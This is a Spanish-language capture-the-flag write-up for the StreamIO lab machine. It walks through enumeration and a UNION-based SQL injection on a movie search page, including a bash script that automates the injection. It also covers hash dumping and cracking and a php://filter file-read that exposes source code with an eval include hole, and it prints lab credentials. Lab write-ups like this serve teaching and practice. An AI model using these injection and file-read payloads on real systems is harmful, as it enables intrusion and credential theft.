## Part 1: Reconocimiento inicial

Primero hacemos un escaneo de puertos, yo he utilizado un script propio, pero con nmap saldrían los mismos resultados. 
Obtenemos una serie de puertos tipicos de directorio activo en microsoft
```bash
└─$ portscan.sh 10.10.11.158
53,88,80,139,135,389,443,445,464,593,636,3268,3269,5985
```

- Con "netexec" hacemos un reconocimiento al puerto 443 (smb) para obtener el sistema operativo. Vemos si esta disponible
la guest o null session (aunque esta última, dificilmente ya que es un Windows 10)
```bash
└─$ nxc smb 10.10.11.158    
SMB    10.10.11.158   445   DC   [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) 

└─$ nxc smb 10.10.11.158 -u "guest" -p "" --shares
SMB    10.10.11.158   445   DC   [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) 
SMB    10.10.11.158   445   DC   [-] streamIO.htb\guest: STATUS_ACCOUNT_DISABLED

└─$ nxc smb 10.10.11.158 -u "test" -p "" --shares
SMB    10.10.11.158   445   DC   [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) 
SMB    10.10.11.158   445   DC   [-] streamIO.htb\test: STATUS_LOGON_FAILURE

└─$ nxc smb 10.10.11.158 -u "" -p "" --shares
SMB    10.10.11.158   445   DC   [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) 
SMB    10.10.11.158   445   DC   [-] streamIO.htb\: STATUS_ACCESS_DENIED
```
- Por el puerto 53 tambien obtenemos cierta información: el nombre del dc
```bash
└─$ dig ns @10.10.11.158 streamio.htb | grep "ANSWER SECTION" -A 2
;; ANSWER SECTION:
streamio.htb.		3600	IN	NS	dc.streamio.htb.
```

- Encontramos varios usuarios en la página `about.php`, creamos una lista de usuarios e intentamos por el puerto 88 ceonsguir
al menos usuarios válidos. No conseguimos ninguno, mas que un tal "martin" a partir de un ataque por diccionario.
```bash
└─$ echo -e "oliver\nbarry\nsamantha" > users.txt

└─$ kerbrute userenum --dc 10.10.11.158 -d streamio.htb users.txt | grep "[+]"
#nada

└─$ kerbrute userenum --dc 10.10.11.158 -d streamio.htb /usr/share/seclists/Usernames/Names/names.txt | grep "[+]"
2024/02/21 11:39:15 >  [+] VALID USERNAME:	martin@streamio.htb

└─$ impacket-GetNPUsers streamio.htb/martin -dc-ip 10.10.11.158 -no-pass
[*] Getting TGT for martin
[-] User martin doesnt have UF_DONT_REQUIRE_PREAUTH set
```

Realizamos fuzzing sobre la web principal
```bash
└─$ wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://streamio.htb/FUZZ.php | grep -E "W|L"
* Wfuzz 3.1.0 - The Web Fuzzer                         *
ID           Response   Lines    Word       Chars       Payload                                               
000000012:   200        205 L    430 W      6434 Ch     "contact"                                             
000000013:   200        230 L    571 W      7825 Ch     "about"                                               
000000002:   200        394 L    915 W      13497 Ch    "index"                                               
000000040:   200        110 L    269 W      4145 Ch     "login"                                               
000000052:   200        120 L    291 W      4500 Ch     "register"                                            
000001134:   302        0 L      0 W        0 Ch        "logout"   

└─$ wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://streamio.htb/FUZZ/ | grep -E "W|L"   
* Wfuzz 3.1.0 - The Web Fuzzer                         *
ID           Response   Lines    Word       Chars       Payload                                               
000000003:   403        29 L     92 W       1233 Ch     "images"                                              
000000243:   403        0 L      1 W        18 Ch       "admin"                                               
000000526:   403        29 L     92 W       1233 Ch     "css"                                                 
000000900:   403        29 L     92 W       1233 Ch     "js" 
000002541:   403        29 L     92 W       1233 Ch     "fonts"

└─$ wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://streamio.htb/admin/FUZZ.php | grep -E "W|L" 
* Wfuzz 3.1.0 - The Web Fuzzer                         *
ID           Response   Lines    Word       Chars       Payload                                               
000000002:   403        0 L      1 W        18 Ch       "index"                                               
000002364:   200        1 L      6 W        58 Ch       "master" 
```
Las paginas de /admin/ devuelven un 403 y un 200 respectivamente
```bash
└─$ curl -sk https://streamio.htb/admin/index.php
<h1>FORBIDDEN</h1>                                                                                                                       
└─$ curl -sk https://streamio.htb/admin/master.php
<h1>Movie managment</h1>
Only accessable through includes    
```
En cuando a `watch.streamio.htb`
```bash
└─$ wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://watch.streamio.htb/FUZZ.php | grep -E "W|L" 
* Wfuzz 3.1.0 - The Web Fuzzer                         *
ID           Response   Lines    Word       Chars       Payload                                               
000000014:   200        7193 L   19558 W    253887 Ch   "search"                                              
000000002:   200        78 L     245 W      2829 Ch     "index"       
```
-----------------------------------

## Part 2: Inyeccion SQLi

Primero hacemos una inyeccion sqli en la interfaz web, luego validamos por la linea de comandos. 
```bash
└─$ curl -sk 'https://watch.streamio.htb/search.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded' \
-d 'q=Star' | html2text | grep -v "^$" 
                               [static/logo.png]
**** Search for a movie: ****
[q                   ] Search
** Star Trek **
2009 Watch
** Star Trek Beyond **
2016 Watch
** Star Trek Into Darkness **
2013 Watch
** Star Wars: Episode II - Attack of the Clones **
2002 Watch
** Star Wars: Episode III - Revenge of the Sith **
2005 Watch
** Star Wars: Episode VII - The Force Awakens **
2015 Watch
** Star Wars: Episode VIII - The Last Jedi **
2017 Watch
** Stardust **
2007 Watch
** The Fault in Our Stars **
2014 Watch
```
Para comprobar si el panel es inyectable, es recomendable utilizar fuzzing de caracteres, para ver cuales puedan ser
cinflictivos, vemos que hay muchos que devuelven 1031 caracteres
```bash
└─$ wfuzz -w /usr/share/seclists/Fuzzing/special-chars.txt -X POST -d "q=FUZZ" 'https://watch.streamio.htb/search.php' | grep -E "W|L" 
* Wfuzz 3.1.0 - The Web Fuzzer                         *
ID           Response   Lines    Word       Chars       Payload                                               
000000001:   200        33 L     77 W       1031 Ch     "~"                                                   
000000003:   200        33 L     77 W       1031 Ch     "@"                                                   
000000018:   200        33 L     77 W       1031 Ch     "]"                                                   
000000017:   200        33 L     77 W       1031 Ch     "}"                                                   
000000007:   200        33 L     77 W       1031 Ch     "^"                                                   
000000022:   200        33 L     77 W       1031 Ch     "`"                                                   
000000015:   200        33 L     77 W       1031 Ch     "="                                                   
000000021:   200        33 L     77 W       1031 Ch     "\"                                                   
000000020:   200        33 L     77 W       1031 Ch     "|"                                                   
000000019:   200        33 L     77 W       1031 Ch     "["                                                   
000000016:   200        33 L     77 W       1031 Ch     "{"                                                   
000000014:   200        5513 L   15358 W    196330 Ch   "+"  
```
Probamos que sale con ese numero de caracteres, lo mas probable esque no de resultados, pero lo podemos comprobar asi:
```bash 
└─$ curl -sk 'https://watch.streamio.htb/search.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded' \
-d 'q=\' | html2text | grep -v "^$"  
                               [static/logo.png]
**** Search for a movie: ****
[q                   ] Search

└─$ curl -sk 'https://watch.streamio.htb/search.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded' \
-d 'q=\' | wc -c 
1031
```
Así que descartamos los resultados que den ese numero de caracteres:
```bash
└─$ wfuzz --hh=1031 -w /usr/share/seclists/Fuzzing/special-chars.txt -X POST -d "q=FUZZ" 'https://watch.streamio.htb/search.php' | grep -E "W|L"
* Wfuzz 3.1.0 - The Web Fuzzer                         *
ID           Response   Lines    Word       Chars       Payload
000000028:   200        785 L    2384 W     29151 Ch    ":"
000000026:   200        49 L     125 W      1612 Ch     "?"
000000025:   200        41 L     98 W       1303 Ch     "/"
000000024:   200        193 L    522 W      6704 Ch     "."
000000023:   200        113 L    310 W      3934 Ch     ","
000000012:   200        281 L    793 W      10048 Ch    "-"
000000014:   200        5513 L   15358 W    196330 Ch   "+"
000000006:   200        7193 L   19558 W    253887 Ch   "%"
000000011:   200        49 L     127 W      1632 Ch     ")"
000000010:   200        49 L     127 W      1632 Ch     "("
000000013:   200        7193 L   19558 W    253887 Ch   "_"
000000008:   200        7193 L   19558 W    253887 Ch   "&"
000000002:   200        65 L     162 W      2144 Ch     "!"
000000005:   200        33 L     77 W       1031 Ch     "$"
```
Ahora, como se está haciendo la peticion SQL? Sabemos que la pelicula `Star Wars: Episode III - Revenge of the Sith` existe
por tanto tenemos que provocar de distintas maneras el mismo resultado:
- `-d "q=Star Wars: Episode III - Revenge of the Sith" | wc -c` da de respuesta 1342 caracteres.
- `-d "q=Sith"`: la ultima parte, tambien devuelve esos caracteres
- `-d "q=Star Wars: Episode III"` la primera parte, tambien, 1342 caracteres
- `-d "q=Episode III"` la mitad, igual.


Por tanto la query que se está tramitando sea lo mas posible: `SELECT title, year FROM movies WHERE title like "%<query>%"`
Utiliza like ya que el usaurio no va a poner el nombre exacto de la pelicula (`Star Wars: Episode III - Revenge of the Sith`) tanto si pones el principio como el final o una parte, por tanto hay dos "%", haciendo la consulta mucho mas flexible
-  ejemplo de una de las querys de antes: `SELECT title, year FROM movies WHERE title like "%Episode III%"`
- si fuera `SELECT title, year FROM movies WHERE title = "Star Wars: Episode III - Revenge of the Sith"` no saldrian resultados poniendo solo una parte sino todo exacto. 
Si quieren practicar consultas SQL pueden utilizar esta [web](https://www.w3schools.com/sql/trysql.asp?filename=trysql_asc)

Lo comprobamos facilmente buscando el caracter que cierre la query, vemos que sale el carcter "%"
```bash
└─$ wfuzz --hh=1031 -w /usr/share/seclists/Fuzzing/special-chars.txt -X POST -d "q=SithFUZZ" \
'https://watch.streamio.htb/search.php' | grep -E "W|L"
* Wfuzz 3.1.0 - The Web Fuzzer                         *
ID           Response   Lines    Word       Chars       Payload
000000006:   200        41 L     106 W      1342 Ch     "%"                                                   
000000008:   200        41 L     106 W      1342 Ch     "&"

└─$ wfuzz --hh=1031 -w /usr/share/seclists/Fuzzing/special-chars.txt -X POST -d "q=Sith%FUZZ-- -" \
'https://watch.streamio.htb/search.php' | grep -E "W|L"
* Wfuzz 3.1.0 - The Web Fuzzer                         *
ID           Response   Lines    Word       Chars       Payload                                               
000000029:   200        41 L     106 W      1342 Ch     "'"                                                   
000000008:   200        41 L     106 W      1342 Ch     "&"                                                   
000000005:   200        33 L     77 W       1031 Ch     "$"                                
```
Por tanto cierra con `'` y no con `"` o parentesis etc, la query correcta es por tanto `(...) WHERE title like '%<query>%'`

Lo siguiente es buscar el numero de columnas, añadiendo `uncion select (...)-- -` y con numeros hasta que de correcto.
Hay que hacer una query que no de resultados, como `-d "q=test"` ¿Cuantas?
```bash
└─$ curl -sk 'https://watch.streamio.htb/search.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded' -d "q=test' union select 1,2,3-- -" | wc -c 
1031

(...)

└─$ curl -sk 'https://watch.streamio.htb/search.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded' -d "q=test' union select 1,2,3,4,5,6-- -" | wc -c 
1296                                                                                                                 
```
Por tanto hay seis columnas en la base de datos actual. Pero ¿Cuales son las que se muestran por pantalla?. Respuesta, la 2
```bash
└─$ curl -sk 'https://watch.streamio.htb/search.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded' -d "q=test' union select @@version,2,3,4,5,6-- -" | html2text
                               [static/logo.png]
**** Search for a movie: ****
[q                   ] Search # o sea no

└─$ curl -sk 'https://watch.streamio.htb/search.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded' -d "q=test' union select 1,@@version,3,4,5,6-- -" | html2text | grep -v "^$"
                               [static/logo.png]
**** Search for a movie: ****
[q                   ] Search
** Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) Sep 24 2019 13:48:23
Copyright (C) 2019 Microsoft Corporation Express Edition (64-bit) on Windows
Server 2019 Standard 10.0  (Build 17763: ) (Hypervisor) **
3 Watch                                                                                                                
```
Ahora habrá que extraer informacion de la base de datos, como sale un output lleno de ruido (`**** Search for a movie:...`)
hay que limpiarlo, estuve trabajando en un script que automatiza esa tarea al que llame `query.sh`
```bash
#!/bin/bash
echo "QUERY: q=test' union select 1,<query> -- -"
while true
do
  echo -n "sql:> " && read query
  curl -sk -X POST 'https://watch.streamio.htb/search.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "q=test' union select 1,$query-- -" | html2text | grep -vE '^$|3 Watch' | tr -d "*" | tail -n +4
done
```
Entonces haremos la query tal que
```bash
└─$ sudo rlwrap bash query.sh
QUERY: q=test' union select 1,<query> -- -
sql:> @@version,3,4,5,6
 Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) Sep 24 2019 13:48:23
Copyright (C) 2019 Microsoft Corporation Express Edition (64-bit) on Windows
Server 2019 Standard 10.0  (Build 17763: ) (Hypervisor) 
```
Asi que obtenemos el resto de datos:
- `sql:> DB_NAME(),3,4,5,6 from master..sysdatabases;` -> la base de datos actual es `STREAMIO`
- `sql:> name,id,4,5,6 from streamio..sysobjects where xtype='U';` sacar las bases de datos y sus ID obtenemos dos, pero la que nos interesa es `users` (id `901578250`)
- `sql:> name,3,4,5,6 from streamio..syscolumns where id=901578250;` salen 4, `id`, `is_staff`, `password`, `username`
- Los hashes `sql:> concat(username,':',password),3,4,5,6 from users;` que metemos en el archivo creds.txt

```bash
└─$ cat creds.txt 
 :d41d8cd98f00b204e9800998ecf8427e 
 admin :665a50ac9eaa781e4f7f04199db97a11 
 Alexendra :1c2b3d8270321140e5153f6637d3ee53 
 Austin :0049ac57646627b8d7aeaccf8b6a936f 
 Barbra :3961548825e3e21df5646cafe11c6c76 
 Barry :54c88b2dbd7b1a84012fabc1a4c73415 
```
Rompemos las contraseñas con hashcat: 
```bash
└─$ hashcat creds.txt /usr/share/wordlists/rockyou.txt --user -m 0 &>/dev/null

└─$ hashcat creds.txt /usr/share/wordlists/rockyou.txt --user -m 0 --show
d41d8cd98f00b204e9800998ecf8427e:
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
```
Para evitarnos la fuerza bruta metemos los usaurios en una lista de usaurios y comprobamos por kerberos cuales existen:
```bash
└─$ cat creds.txt | awk '{print $1}' FS=":" > users.txt

└─$ kerbrute userenum --dc 10.10.11.158 -d streamio.htb users.txt | grep "+"
2024/02/21 14:37:16 >  [+] VALID USERNAME:	yoshihide@streamio.htb
```
Como curiosidad, solo es valido el que estaba en mayusculas... cosas de los ctf. Vemos que contraseña tiene este usuario
```bash
└─$ cat creds.txt | grep "yoshi"
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```
Intentamos registrarnos en varios servicios con dichas credenciales, pero no nos da valido...
```bash
└─$ nxc smb 10.10.11.158 -u "yoshihide" -p "66boysandgirls.."         
SMB    10.10.11.158   445  DC       [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) 
SMB    10.10.11.158   445  DC       [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE 

└─$ rpcclient -U "yoshihide%66boysandgirls.."  10.10.11.158
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```
----------------------

# Part 3: Acediendo al panel de admin


Pero si nos permite loguearnos en la pagina de admin, obtenemos su cookie de sesion `PHPSESSID`. 
```bash
└─$ curl -sk https://streamio.htb/admin/index.php                                                  
<h1>FORBIDDEN</h1>                                                                                                                       
┌──(jessica㉿kali)-[~/Documents/streamio]
└─$ curl -sk https://streamio.htb/admin/index.php -H "Cookie: PHPSESSID=uegigt0qmv7n8d2432kfb0o0g7"
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
...
```  
Vemos que hay varias opciones, las cuales se traducen en parametros... no encontramos ninguno muy interesante, pero a lo
mejor no se estan mostrando todos los posibles
```bash
└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' \
 -H "Cookie: PHPSESSID=uegigt0qmv7n8d2432kfb0o0g7" --hh 1678
000001575:   200        49 L     137 W      1712 Ch     "debug"                                               
000003530:   200        10766    25810 W    319472 Ch   "movie" 
000005450:   200        398 L    916 W      12484 Ch    "staff"
000006133:   200        122 L    295 W      3928 Ch     "user"
```

¿Que podemos hacer con debug? Si ponemos un comando no sale nada
```bash
└─$ curl -sk 'https://streamio.htb/admin/index.php?debug=whoami' -H "Cookie: PHPSESSID=uegigt0qmv7n8d2432kfb0o0g7" | html2text | grep -v "^$"
                           ****** Admin panel ******
===============================================================================
    * User_management
    * Staff_management
    * Movie_management
    * Leave_a_message_for_admin
===============================================================================
                      this option is for developers only
```
Pero si ponemos una ruta que sabemos que existe en windows `C:\Windows\System32\drivers\etc\hosts`
```bash
└─$ curl -sk 'https://streamio.htb/admin/index.php?debug=C:\Windows\System32\drivers\etc\hosts' -H "Cookie: PHPSESSID=uegigt0qmv7n8d2432kfb0o0g7" | html2text | grep -v "^$"
(...)
    * Leave_a_message_for_admin
===============================================================================
this option is for developers only# Copyright (c) 1993-2009 Microsoft Corp. # #
This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file
  contains the mappings of IP addresses to host names. Each # entry should be
```                  
Interesante sería ver el codigo fuente de la web, pero no sabemos cual es la ruta aunque intentemos adivinar
```
└─$ curl -sk 'https://streamio.htb/admin/index.php?debug=C:\inetpub\wwwroot\streamio\index.php' -H "Cookie: PHPSESSID=uegigt0qmv7n8d2432kfb0o0g7" | html2text | grep -v "^$"
```
Sabemos que la estructura de la web principal es tal que:
```
                              [streamio.htb]
  ┏━━━━━━━━━━━━━━┳━━━━━━━━━━━━━┳━━━━━┻━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━┓
index.php    contact.php   about.php    login.php    register.php    logout.php     admin
                                                                              ┏━━━━━━┻━━━━━━┓
                                                                          index.php    master.php

                             [watch.streamio.htb]
                                ┏━━━━━┻━━━━━━┓
                          index.php      search.php
```
Si buscamos la principal `index.php` nos sale un error, eso es porque un recurso PHP entra en bucle si se carga a si
mismo, por tanto utilizaremos el wrapper de codificacion en base64, para que salga una cadena codificada que 
no se interprete y por tanto entre en conflicto
```bash
└─$ curl -sk 'https://streamio.htb/admin/index.php?debug=index.php' -H "Cookie: PHPSESSID=uegigt0qmv7n8d2432kfb0o0g7" \
| html2text | grep -v "^$" | grep "developers" -A "5"
     this option is for developers only ---- ERROR ----
```              
Con ciertos filtros podemos encontrar el codigo en base64, descifrarlo
```bash
└─$ curl -s 'https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=Index.php' -k \
-H "Cookie: PHPSESSID=uegigt0qmv7n8d2432kfb0o0g7" | html2text | grep -v "^$" | grep "only" -A 2 | tr -d "/\n " | \
sed s/only//g | base64 -d 2>/dev/null | sed -n '/^<?php/,/^?>/p'
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
  header('HTTP/1.1 403 Forbidden');
  die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);
?>
```

Conseguimos una contraseña, ¿pero que recursos mas podemos ver?
```bash
└─$ curl -s 'https://streamio.htb/admin/?debug=noexisto.php' -k -H "Cookie: PHPSESSID=uegigt0qmv7n8d2432kfb0o0g7" | wc -c
1712

└─$ wfuzz --hc=404 --hh=1712 -H "Cookie: PHPSESSID=uegigt0qmv7n8d2432kfb0o0g7" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 'https://streamio.htb/admin/?debug=FUZZ.php'
000000001:   200        46 L     136 W      1693 Ch     "index"
000002560:   200        11158    26706 W    342677 Ch   "master"
```
Por tanto repetimos el proceso con master.php, la parte de decodificar la tuve que hacer a mano porque daba errores,
fui al codigo fuente de la pagina y copie el texto en base64 a un archivo para decodificarlo con `base64 -d`
```bash
└─$ cat base64text | base64 -d | sed -n '/^<?php/,/^?>/p' > master.php
```
Si compactamos el codigo...
```php
<?php
if(!defined('included')) die ("Only accessable through includes");

if(isset($_POST['movie_id'])) { // si por post envias data con "movie_id" hace estas consultas a la base de datos
  $query = "delete from movies where id = ".$_POST['movie_id'];
  $res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered")); }
$res = sqlsrv_query("select * from movies order by movie";, $query, array(), array("Scrollable"=>"buffered"));


if(isset($_POST['staff_id'])) {} // si por post envias data con "star_id" hace estas consultas a la base de datos
$res = sqlsrv_query($handle, "select * from users where is_staff = 1 ", array(), array("Scrollable"=>"buffered"));

if(isset($_POST['user_id'])) { // // si por post envias data con "user_id" hace estas consultas a la base de datos
  $query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
  $res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered")); }
$res = sqlsrv_query($handle, "select * from users where is_staff = 0", array(), array("Scrollable"=>"buffered"));

if(isset($_POST['include'])) { // en cambio con include puedes obtener archivos
  if($_POST['include'] !== "index.php" ) eval(file_get_contents($_POST['include']));
  else echo(" ---- ERROR ---- ");}
?>
```
Chatgpt nos analiza el codigo y nos dice que:
El código PHP proporcionado realiza las siguientes acciones:

- Comprueba si la constante `'included'` está definida. Si no está definida, muestra un mensaje de error y finaliza la ejecución del script. Esto se hace para evitar que el script se ejecute directamente y solo pueda ser incluido desde otros archivos.

- Verifica si se ha enviado una variable `$_POST['movie_id']`. Si es así, elimina la entrada correspondiente en la tabla `movies` de la base de datos utilizando el ID proporcionado en la variable `$_POST['movie_id']`. Luego, realiza una consulta para seleccionar todas las filas de la tabla `movies` y las ordena por el campo `movie`.

(..) mas informacion sobre consultas a la base de datos

Vemos que desde la web tenemos interacción con esta, haremos un favor al mundo.

